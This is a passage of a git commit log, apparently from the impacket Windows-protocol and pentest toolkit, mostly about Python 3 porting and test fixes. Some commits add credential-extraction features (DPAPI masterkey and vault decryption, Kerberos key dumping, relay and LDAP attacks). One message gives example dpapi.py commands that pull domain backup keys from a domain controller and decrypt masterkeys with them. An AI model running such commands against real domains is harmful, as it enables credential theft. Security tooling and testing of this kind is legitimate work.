Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 12:14:55 2018 -0300

    Changing Copyright notice

commit 7589c6af2866bc292ae8eecfc9f9c376f44994da
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:56:14 2018 -0300

    Fixing specific Python3 issues

commit a9bec39344330c20ad66e8d163ee41129f9764b2
Merge: 3c3d7be7 13a65706
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:52:37 2018 -0300

    Merge branch 'master' into python36

commit 13a65706273680c297caee0211460ef7369aa8ca
Merge: c4d60b3b bb6ffb37
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:45:45 2018 -0300

    Merge branch 'MrAnde7son-patch-7'

commit bb6ffb3707f0b531d3968cbc2e85e2f8d39c3b09
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 11:44:54 2018 -0300

    Small adjustments
    
    - Making it Python3 friendly (needs more tests)
    - Simplyfing use of Structure
    - Ask for password if not supplied

commit 3c3d7be748805d43ea3fcde79015f04166a874a6
Author: asolino <bethus@gmail.com>
Date:   Wed Dec 5 10:46:32 2018 -0300

    Adding / removing new line at the end of files

commit 6e4d73641d2cc8369642f396b9d38d54f0d13552
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 5 13:05:52 2018 +0200

    Update dpapi.py

commit c67b7cb5435675b009d9bd90fd9acfcb1061805a
Author: Itamar <mizrahi.itamar@gmail.com>
Date:   Wed Dec 5 13:00:54 2018 +0200

    masterkeys decryption using domain backupkey
    
    Hola,
    I added support for domain backup keys extraction for the use of master keys decryption (huge thanks and credit to @gentilkiwi)
    Example:
    # Extract domain backup keys
    dpapi.py -debug backupkeys -t domain/user:password@DC --export
    
    # decrypt master key using PVK file
    dpapi.py masterkey -file 8ef4fb99-bb78-4592-b989-303c4aea5554 -pvk G$BCKUPKEY_E63DFF3E-CB30-41AF-AB69-FF7B8769C39B.pvk

commit 22df3574c97dc78b8e983e4494c6c9940e7217c6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:33:47 2018 -0300

    Fixing unicode error in Python3

commit 985746b20a686a9bd47472a6cb33ddd32531ba52
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:18:22 2018 -0300

    Adding lost my_gcd function

commit 7eeff437c764a2e1c88d761d41ccaef169b6ce58
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 17:07:52 2018 -0300

    More code cleanup homework
    
    - Optimizing imports
    - Removing unused variables
    - Still a lot to do.
    - Test cases passing OK

commit 3202da4a1f4191129419ab16a3377e654bf28186
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 14:54:43 2018 -0300

    Fixing testcase for Python3

commit ec77ea3d069ed5725504aa9896694188cdb092f6
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 14:47:16 2018 -0300

    Code cleanup homework
    
    - Optimizing imports
    - Removing unused variables
    - Still a lot to do.
    - Test cases passing OK

commit f154b9cbd241bb343bcf952ea6f16b40170127ff
Author: asolino <bethus@gmail.com>
Date:   Tue Dec 4 13:27:14 2018 -0300

    Ignoring some errors we don't want to check

commit d7b6ba669a7b13743dbaaf4941a42cd6b1a780af
Author: asolino <bethus@gmail.com>
Date:   Mon Dec 3 14:16:27 2018 -0300

    Fixing two test cases failing in Python36

commit c6a18bdffaf579c1d7dbfead6fde277399add9d8
Merge: 47f67915 c4d60b3b
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:57:06 2018 -0300

    Merge branch 'master' into python36

commit c4d60b3b29239b54628935c29e3c710ac25f288b
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:42:28 2018 -0300

    Documentation for helper functions

commit 47f67915203b4901e47cbc6d9320a8c666b85f2d
Merge: 9d0d7522 5723ad39
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:11:58 2018 -0300

    Merge branch 'master' into python36

commit 5723ad399d477035848dff0f44b35da26963f2ec
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:11:30 2018 -0300

    bytesNeeded must be calculated inside the exception

commit 9d0d752253b11ad8122ef44a49716b7031fdba99
Merge: dda9b667 5f77083d
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:02:59 2018 -0300

    Merge branch 'master' into python36

commit 5f77083df032a8fe142ee26cc076c6d6e49d42e3
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 09:02:35 2018 -0300

    Fixing minor bug in testcase

commit dda9b667dfd338e0e4056ebacc220747d4bffd11
Merge: 587482e0 862451a7
Author: asolino <bethus@gmail.com>
Date:   Sun Dec 2 08:56:51 2018 -0300

    Merge branch 'master' into python36

commit 587482e0f7175fa8cb542aae3df7e53802c4c637
Merge: c8430202 1e08690c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Dec 2 08:48:49 2018 -0300

    Merge pull request #533 from eldipa/Remove-Deprecated-Has-Key-Method
    
    Replace dict's has_key by in operator

commit 1e08690c5e4cb2c5ab388cded7214497b84515a8
Merge: 315579c1 c8430202
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Sun Dec 2 08:48:17 2018 -0300

    Merge branch 'python36' into Remove-Deprecated-Has-Key-Method

commit 315579c1c4e87996236150d488672eee359f047d
Author: Martin Di Paola <martinp.dipaola@gmail.com>
Date:   Sun Dec 2 01:25:28 2018 +0000

    Replace dict's has_key by in operator
    
    Removed the deprecated has_key method of dict and replaced it by
    the 'in' operator.

commit 862451a74adc94c0b3fa414d69d7cc566e894f2d
Author: asolino <bethus@gmail.com>
Date:   Sat Dec 1 15:30:10 2018 -0300

    Adding RPRN calls
    
    - RpcClosePrinter, RpcEnumPrinters and their helper functions

commit c8430202c3532a586799483171d5fc71139f46f5
Merge: b2861a4d ace5205e
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:50:19 2018 -0300

    Merge branch 'master' into python36

commit ace5205e9cd37a71e2855c9d50493e91bcf67c14
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:14:35 2018 -0300

    Checking string is NULL terminated

commit a656dfa737f4a7039f2a96dbea3dae56145b431b
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 15:12:20 2018 -0300

    Helper functions for the calls implemented

commit 6966e22513c648ac20da4cc30b9d8e9f630d04e8
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 30 14:52:31 2018 -0300

    [MS-RPRN] Interface implementation (Initial)
    
    - Just a few methods for now. Needed for @leechristensen RPRN great discovery

commit b2861a4dab7625eb64eb284a49cef47e3771acb0
Merge: 58ef9c2c 8fa94594
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 29 09:42:19 2018 -0300

    Merge pull request #531 from infinnovation-dev/wepencoder-fix
    
    Fixes for failing test_WEPEncoder on python36 branch

commit 58ef9c2c41300b4fc5a31fd2944e4f29772bd037
Merge: 99958427 47729edd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 29 09:41:34 2018 -0300

    Merge pull request #532 from infinnovation-dev/helper-fix
    
    Fixes for failing dot11/test_helper on python36 branch

commit 47729edd0fc5cf2dfac19826a9b86e39b180c30c
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Wed Nov 28 23:05:00 2018 +0000

    helper: Fix for python2/python3 compatibility
    
    Use six to handle differences in mataclass handling.
    Avoid 'dictionary changed size during iteration' error.

commit 8fa94594f640a0dc7719d8b4f19c2112561c6c85
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Wed Nov 28 22:33:21 2018 +0000

    Dot11Crypto: Fix RC4 to be python2/python3 compatible
    
    Use bytearray for consistent indexing behaviour.
    Also fix a failing test in test_WEPEncoder.py by using unhexlify.

commit 99958427a59b9b4291ed645489873f0da36c663a
Merge: cf903d32 06968c16
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Nov 28 13:27:58 2018 -0300

    Merge pull request #530 from cclauss/eliminate-undefined-name__spec__
    
    Eliminate undefined name  spec

commit cf903d329985b697052d73c81b825cad1a7bb76a
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 27 11:27:57 2018 -0300

    Omitting .tox directories

commit 940b0d6094eed09319ea205e05411eb05adadea4
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 27 11:22:24 2018 -0300

    Launching test_nrpc.py automatically with the rest of the tests
    
    - dcetests.cfg was modified adding machine account data

commit 06968c1610a8591fe176f1a45e960681ab6ba22f
Author: cclauss <cclauss@bluewin.ch>
Date:   Tue Nov 27 14:50:27 2018 +0100

    Eliminate undefined name __spec__ on Python 2

commit 0d8fcd4b875ec71a976603aaebd063dfcb20207c
Author: asolino <bethus@gmail.com>
Date:   Sat Nov 24 10:31:13 2018 -0300

    Convert tabs to spaces

commit 34e4574930490c66f2ccd44d0189aa0dc03a4a92
Merge: 518bc038 93f9992d
Author: asolino <bethus@gmail.com>
Date:   Sat Nov 24 10:28:47 2018 -0300

    Merge branch 'cclauss-more-py3-fixes' into python36

commit 93f9992d7cf7c2dea31e773fb4d399ebd973b613
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:37:52 2018 +0100

    flake8 . --ignore=E1,E2,E3,W293

commit d225ea10b5f5e0eab70727f683c42efe062e6bf5
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:30:31 2018 +0100

    flake8 . --ignore=E1,E2,E3

commit fefb28c16a226be58b06e79bbba5518b84db91b3
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:25:49 2018 +0100

    flake8 --ignore=E1,E2

commit cbed78f7b498181a9d877c22671f86edc809bb7b
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:20:14 2018 +0100

    flake8 --ignore=E2

commit 80506c1620c665882ffa043f5451ef8b0cef48f3
Author: cclauss <cclauss@bluewin.ch>
Date:   Sat Nov 24 00:06:49 2018 +0100

    Fix more Python 3 issues

commit 518bc038d4982add186d4ba097604a66fafb6103
Merge: 46f79aab c6e7e378
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 15:40:07 2018 -0300

    Merge pull request #527 from cclauss/patch-1
    
    Old style exception on Py3 branch

commit 46f79aab15164b4c469b512319021edec787414f
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:39:39 2018 -0300

    Python3 port for test_secretsdump.py

commit e83dc2de171fb43004c0543bf851c0426cc158d8
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:39:01 2018 -0300

    Print Python version being used

commit fa758dfab8fd1eb0b0c995ad82bd172864d338fe
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 15:38:29 2018 -0300

    Calling coverage through python instead of just running the exec

commit c6e7e378ebe6024f605ca376d051cb24f35d8b95
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:38:28 2018 +0100

    Use feature detection instead of version detection
    
    Python porting best practice: https://docs.python.org/3/howto/pyporting.html#use-feature-detection-instead-of-version-detection

commit b6a37ae56356c1376d52349f8f2c900d50cf1b77
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:35:16 2018 +0100

    Use repr(value) instead of `value`for Python 3

commit cd6bcd0628ceceb9f9e0faa45febb93e1f62bbd0
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:29:26 2018 +0100

    Old style exceptions --> new style

commit 781178227a5e966c04f2e6cc1266da44cd6b4b84
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:25:59 2018 +0100

    Use print() function in both Python 2 and Python 3

commit fd5f464895f237dcbc2d215750783e3c879194be
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:20:02 2018 +0100

    Undefined name: loggin --> logging

commit 01827369e8a7fdc236b6a813a745bac86971d775
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 19:02:00 2018 +0100

    Old style exception on Py3 branch

commit df591c2fbfb2d8fabf947ec7f1d582e14844527d
Merge: 7887c5a3 76cf9569
Author: asolino <bethus@gmail.com>
Date:   Fri Nov 23 09:17:08 2018 -0300

    Merge branch 'master' into python36

commit 76cf9569306f555ed53a94bdfee638686bc74ee7
Merge: 5adeffca 7f026f29
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 09:08:25 2018 -0300

    Merge pull request #525 from cclauss/patch-3
    
    Travis CI: Add flake8 to find syntax errors and undefined names

commit 5adeffca811b7c3cc470ef43c7a1f4e221f81431
Merge: 22d332ac 41666731
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Nov 23 09:03:22 2018 -0300

    Merge pull request #524 from cclauss/patch-1
    
    Use print() function in examples/ping6.py

commit 7f026f291a828479f65e51d5967f1ae25303737b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 23 11:15:57 2018 +0100

    Travis CI: Add flake8 to find syntax errors and undefined names
    
    Test on both Python 2.7 and 3.6 and add flake8 to find find syntax errors and undefined names.  Run the Python 3 tests in __allow_failures__ mode until the __python36__ branch is merged.
    
    
    __E901,E999,F821,F822,F823__ are the "_showstopper_" [flake8](http://flake8.pycqa.org) issues that can halt the runtime with a SyntaxError, NameError, etc. Most other flake8 issues are merely "style violations" -- useful for readability but they do not effect runtime safety.
    * F821: undefined name `name`
    * F822: undefined name `name` in `__all__`
    * F823: local variable name referenced before assignment
    * E901: SyntaxError or IndentationError
    * E999: SyntaxError -- failed to compile a file into an Abstract Syntax Tree

commit 416667316ad06242fb82c0d0b664c13ef5cd4ef1
Author: cclauss <cclauss@bluewin.ch>
Date:   Thu Nov 22 19:01:34 2018 +0100

    Use print() function in examples/ping6.py

commit 7887c5a360c485cd9131b7b5a20b936b55ce4325
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 16:45:53 2018 -0300

    Fixing some py36 errors
    
    - Thanks @dirkjanm for bringing them up

commit 98bdbeb95d620e506a2ef89447da3f10419b0a7c
Merge: c017dd06 22d332ac
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 16:08:27 2018 -0300

    Merge branch 'master' into python36

commit 22d332acac1e7a41e030b7ee25eda4b0bbd753e1
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:42:20 2018 -0300

    Fixing some errors generated by flake8
    
    - Should address the remaining cases for https://github.com/SecureAuthCorp/impacket/issues/494

commit 32778d507acc82d11082bcaad65407d79428c106
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:32:56 2018 -0300

    Removing deprecated/old code.

commit c017dd068ec0c23682a405fb02bcdbf9aede0991
Merge: 6d06423f 59bb4b56
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:10:07 2018 -0300

    Merge branch 'master' into python36

commit 59bb4b56ddbec841d791813abf899dd2477099e0
Merge: 61d24d71 23c21569
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:09:27 2018 -0300

    Merge branch 'MrAnde7son-patch-5'

commit 23c215691640e0a5d668399d98f89014816be59c
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:09:10 2018 -0300

    Fixing test case

commit ac7664382148c1a1162ca2ef2f089e6119cc99fc
Merge: ca456a45 2dbaf8b0
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 15:06:09 2018 -0300

    Merge branch 'patch-5' of https://github.com/MrAnde7son/impacket into MrAnde7son-patch-5

commit 6d06423f066adb94bc03e2ccd7e616a4f9328f7b
Merge: a22809a4 61d24d71
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 14:50:57 2018 -0300

    Merge branch 'master' into python36

commit 61d24d713c380761a226733b1498905a98ccbe84
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:58:59 2018 -0300

    Start the RemoteRegistry services if not enabled by default

commit eae5d8a51a843eb1f49c7fd61053f26946600fb7
Merge: 6c9f7b8f ebaec624
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:32:38 2018 -0300

    Merge branch 'infinnovation-dev-ci'

commit ebaec6241914a595b04bb93f4bce8f2194803b01
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:31:25 2018 -0300

    Minor adjustements
    
    - Changing NO_DCE to NO_REMOTE since that is what we're limiting (there are NON DCE Remote tests that aren't ran, i.e. test_smb).
    - Put some test that do not require remote interaction to run (i.e. test_spnego)

commit 82bdb87e3acdecdbd70186f1a443c438161ff0cc
Merge: 6c9f7b8f 073782ea
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 12:07:50 2018 -0300

    Merge branch 'ci' of https://github.com/infinnovation-dev/impacket into infinnovation-dev-ci

commit a22809a46fbf0168db0ce9162e6b6ece755251b7
Merge: 4446728b 6c9f7b8f
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:58:42 2018 -0300

    Merge branch 'master' into python36

commit 6c9f7b8f2835f8bd6714411c857aeee1e86f2f46
Merge: 60741b8e e3f9780c
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:34:17 2018 -0300

    Merge branch 'fox-it-krbkeys-master'

commit e3f9780c5241bd14749b5866d9288c420de36ab1
Merge: 60741b8e d519d170
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 20 10:26:10 2018 -0300

    Merge branch 'krbkeys-master' of https://github.com/fox-it/impacket into fox-it-krbkeys-master

commit 073782ea0f820d78c4186fa48cfb99d09706c7b9
Author: Colin Hogben <colin@pythontech.co.uk>
Date:   Mon Nov 19 19:49:27 2018 +0000

    Add configuration to run the tox tests using travis-ci
    
    A basic .travis.yml file is added.  Additionally, tox.ini and
    runall.sh are modified to enable passing a "NO_DCE" environment
    variable.  This allows skipping the tests which require a Windows 2012
    R2 Domain Controller, which is not available in travis-ci.

commit 4446728b2ddbfa10e69a9c3c3b462d37508403fa
Merge: a974603c 60741b8e
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 15:55:27 2018 -0300

    Merge branch 'master' into python36

commit 60741b8e66c6f0a4d90efa9f75a2f8ccb0a95bc1
Merge: 12e36349 977ae7b8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 15:54:28 2018 -0300

    Merge pull request #521 from fox-it/kerberoast-trust
    
    Bugfixes and cross-domain support in GetUserSPNs.py

commit a974603cd95db931570705caa529749c0446a590
Merge: 19334ddf 12e36349
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 13:03:21 2018 -0300

    Merge branch 'master' into python36

commit 12e363497161d771c32fe9c0c967181647dcaaeb
Merge: bca1174b 1e58c88a
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 13:02:54 2018 -0300

    Merge pull request #516 from cclauss/patch-1
    
    Use print() function in examples/ping.py

commit 19334ddf542d036f13bd5ae1ac46acc0ef91d6c2
Merge: 8a683396 bca1174b
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 19 12:30:38 2018 -0300

    Merge branch 'master' into python36

commit bca1174b2679cf78bbd5200b2a3a749f77d89996
Merge: 5db95012 3f29d8dc
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 12:24:37 2018 -0300

    Merge pull request #518 from vszakats/urlfix
    
    fix/secure URLs

commit 5db950121488984b3daadca5b5048b6e902904af
Merge: f9890ec9 638532d1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Nov 19 10:04:35 2018 -0300

    Merge pull request #517 from vszakats/patch-1
    
    LICENSE: use HTTPS links

commit 3f29d8dcdbff92f94d1f0042074eb5a2f3dacfe7
Author: Viktor Szakats <commit@vszakats.net>
Date:   Fri Nov 16 12:53:38 2018 +0000

    fix/secure URLs
    
    * also remove/fix some whitespace such as tabs
      and spaces at EOL

commit f9890ec9cedb17ca5834169c0138850de01a6179
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 18 11:26:33 2018 -0300

    Do not encrypt if anonymous connections is established
    
    Should address https://github.com/SecureAuthCorp/impacket/issues/520

commit 977ae7b8d3374266bb1f04677e0a11726d92a264
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Nov 17 14:59:29 2018 +0100

    Bugfixes and cross-domain support in GetUserSPNs.py

commit d519d1700f2eb71a0a43ab908733b3031ac5958f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sat Nov 17 11:10:17 2018 +0100

    Added dumping of machine account Kerberos keys to secretsdump

commit 638532d1af798b8456109ed4abc685c57c5b8657
Author: Viktor Szakats <vszakats@users.noreply.github.com>
Date:   Fri Nov 16 13:02:21 2018 +0100

    LICENSE: use HTTPS links

commit 1e58c88a0d466cd7c1b702b638fcdd4ceada094b
Author: cclauss <cclauss@bluewin.ch>
Date:   Fri Nov 16 12:25:12 2018 +0100

    Use print() function in examples/ping.py

commit 8a6833967ee55b1e6ade3d37a701e087bebd09fa
Merge: a43ab5f5 41cd725d
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 15:26:50 2018 -0300

    Merge branch 'master' into python36

commit 41cd725d7d76e502d74ae15a77ab5d27ff6bd172
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 15:25:56 2018 -0300

    Adding NGC_LOCAL_ACCOOUNT local accoount structure
    
    - Have fun :)

commit a43ab5f5e01b46d5ebb3cf210e2eed8ba073c4eb
Author: asolino <bethus@gmail.com>
Date:   Tue Nov 13 14:57:03 2018 -0300

    Fix configparser Py2 error

commit febc5dae85009a0f113a9cbf0e9ebbcdcee3e322
Author: imaibou <ai_bounab@esi.dz>
Date:   Sun Nov 11 00:07:49 2018 +0100

    added GetInterestingFiles.py example script
    
    Created script to search programmatically for interest files on a network share. The search is based on the remote file name and the search criteria can be changed by the pentester.

commit 98b0ae0ddf67a6803f716a036401250f11ab7b3a
Merge: 88f31141 a5086558
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:48:22 2018 -0300

    Merge branch 'master' into python36

commit a50865582791990bf7e27c7cf769fb6710f5105c
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:47:32 2018 -0300

    Parsing DPAPI_SYSTEM according to the new changes just introduced in secretsdump

commit 88f31141fe5789befb9a58e523b5395903b601fa
Merge: 25acb58a 927803ef
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:31:20 2018 -0300

    Merge branch 'master' into python36

commit 927803ef60dfd296004dab47b77fac6bd4374b3d
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:30:04 2018 -0300

    Now DPAPI keys are parsed and shown as user and machine keys
    
    So you can later on use them with dpapi.py example (or any other tool)

commit b75d710e5603a0f8ae40be941dc2229b9a377530
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 8 12:25:30 2018 -0300

    Adding DPAPI / Vaults related structures, testcase and example.
    
    You can unlock masterkeys, credentials and vaults. For the three, you will specify the file name (using -file for
    masterkeys and credentials, and -vpol and -vcrd for vaults).
    If no other parameter is sent, the contents of these resource will be shown, with their encrypted data as well.
    If you specify a -key blob (in the form of '0xabcdef...') that key will be used to decrypt the contents.
    In the case of vaults, you might need to also provide the user's sid (and the user password will be asked).
    For system secrets, instead of a password you will need to specify the system and security hives.
    
    References: All of the work done by these guys. I just adapted their work to my needs.
    https://www.passcape.com/index.php?section=docsys&cmd=details&id=28
    https://github.com/jordanbtucker/dpapick
    https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials (and everything else Ben did )
    http://blog.digital-forensics.it/2016/01/windows-revaulting.html
    https://www.passcape.com/windows_password_recovery_vault_explorer
    https://www.passcape.com/windows_password_recovery_dpapi_master_key

commit 25acb58a52a408fd55e74edfc32adb9d61ba4a82
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 31 11:03:50 2018 -0300

    If hexdump() received None, return

commit 748a44c47c516cedcfaeaa3982d3af5e9ec99ba7
Merge: 4a1a9071 46ffda63
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 18:25:25 2018 -0300

    Merge branch 'master' into python36

commit 46ffda630f9191be6a04e378d28031d49e20fd02
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 18:22:25 2018 -0300

    Do not assume the target SMB3 server supports encryption
    
    - Check if the server confirmed encryption capabilities returned in the negotiate packet.
    - This was breaking a SOCKs proxy relay use case (https://github.com/SecureAuthCorp/impacket/issues/509)

commit 4a1a90718e3a1cf89254c4f19185a4293f8bde35
Merge: fdf550a9 ff658d5c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 13:43:28 2018 -0300

    Merge branch 'master' into python36

commit ff658d5cc2a6299cdf157152bba5ee622003ed7a
Merge: 9efa50fe 074708af
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Oct 24 13:43:01 2018 -0300

    Merge pull request #510 from cauan/patch-1
    
    Update secretsdump.py

commit 074708afc76866ff9e887681d2b08fbcf8a9cb7c
Author: Cauan <cauan@users.noreply.github.com>
Date:   Wed Oct 24 13:29:28 2018 -0300

    Update secretsdump.py
    
    Set remoteName instead of address in case the password contains '@'

commit fdf550a9a5f36b3b617a038be76247a7f3c24d52
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 11:57:04 2018 -0300

    Removing stacktrace print

commit 9adc58b9abc7bf12a00e03caa78affa317c2ffed
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 24 11:49:35 2018 -0300

    Fixing ntlmrelayx.py errors when running with -smb2support

commit 793605ac29cff9640c54be6216f96416925fe0ad
Merge: caa8c541 9efa50fe
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 22 14:52:30 2018 -0300

    Merge branch 'master' into python36

commit 9efa50fe55a2aa1d6fa06d3f5a4d729f388b39aa
Author: asolino <bethus@gmail.com>
Date:   Mon Oct 22 14:50:42 2018 -0300

    Avoid aborting when a decode fails
    
    - Althought it shouldn't happen, we found an instance where bypassing the decoding error will allow the script to continue and successfuly parse a DIT file. More research needed.
    - Should address https://github.com/SecureAuthCorp/impacket/issues/503

commit caa8c5418c14e7616458caa3ad45737966f1f64f
Merge: c996765f a8c05f42
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 21 19:55:12 2018 -0300

    Merge branch 'fox-it-python36' into python36

commit a8c05f424cf360cc89fb06a4f927d9502a1406f6
Merge: 6fe7db58 8f95732f
Author: asolino <bethus@gmail.com>
Date:   Sun Oct 21 19:54:55 2018 -0300

    Merge branch 'python36' of https://github.com/fox-it/impacket into fox-it-python36

commit 8f95732fdff73e508d63af9326f1245d9542e9a6
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Oct 21 22:25:44 2018 +0200

    Small bugfixes pointed out by pylint

commit 996c586403a3b7b76d6fcced9e6b64dd2facd317
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Sun Oct 21 12:10:25 2018 +0200

    ldap attack port to py3 wrapup and bugfixes

commit 429c4b77fc63655499088a02bc89f0290ec7bad1
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 21:21:44 2018 +0200

    ldap attack port to py3 part 1

commit c996765f1b61e1abcd002ea5640258a6b0cefe76
Merge: 6b6d496b dac0ad19
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 16:47:41 2018 -0300

    Merge branch 'master' into python36

commit dac0ad199c19e7e3ae6daaba0b5afd39d3a8427c
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 15:53:08 2018 -0300

    Adding extra debugging data

commit 6b6d496bdf6a1dfd4ea279a3771d422e4be81bb0
Merge: 81304e33 55bfef0e
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:09:37 2018 -0300

    Merge branch 'python36' of https://github.com/SecureAuthCorp/impacket into python36

commit 55bfef0e1a22e7e32fa3e28ec9e1f4db4a2ba8f5
Merge: f041099a 4df178ac
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Oct 18 14:07:17 2018 -0300

    Merge pull request #506 from fox-it/python36
    
     py3 fix for egg installs and imports

commit 6fe7db58baf9fe3e918b64366ab18282e81243fd
Merge: 81304e33 4df178ac
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:02:31 2018 -0300

    Merge branch 'python36' of https://github.com/fox-it/impacket into fox-it-python36

commit 81304e3362093ac9db0579ae9a11842cb0da25e9
Merge: f041099a a570dbce
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 14:02:04 2018 -0300

    Merge branch 'master' into python36

commit a570dbce64e3c6203b944d40eb7830d83b631a5c
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 18 13:58:08 2018 -0300

    Adding traceback info when running in debug mode

commit 4df178ac600c0561e68b2e7331d3fe2e61612134
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:48:16 2018 +0200

    Also fixed socks plugins

commit 760e78c1ad705a4dbdc00132891e8f0930ef8051
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:02:52 2018 +0200

    Documented motivation for change better

commit 4fe4eb5422cbba83b579de837a8a4a22f572aa56
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Oct 18 18:01:22 2018 +0200

    py3 fix for egg installs and imports

commit f041099a395d289092a35a06b1a986aaeefdd5fc
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 18:45:39 2018 -0300

    split.py Python3 port
    
    - I modified the original example just to simplfy some things. Not ideal but it will serve the purpose of it.

commit eced356cff9d4e92768ca62a364c423daab67111
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 16:40:24 2018 -0300

    ntfs-read.py Python3 port

commit 73633dcc0643053e50e9e95b7b52c8d900626937
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 17 12:11:20 2018 -0300

    sniffer.py Python3 port

commit b4a8db6027e50232ea1863d5426c1a4ffead6673
Author: asolino <bethus@gmail.com>
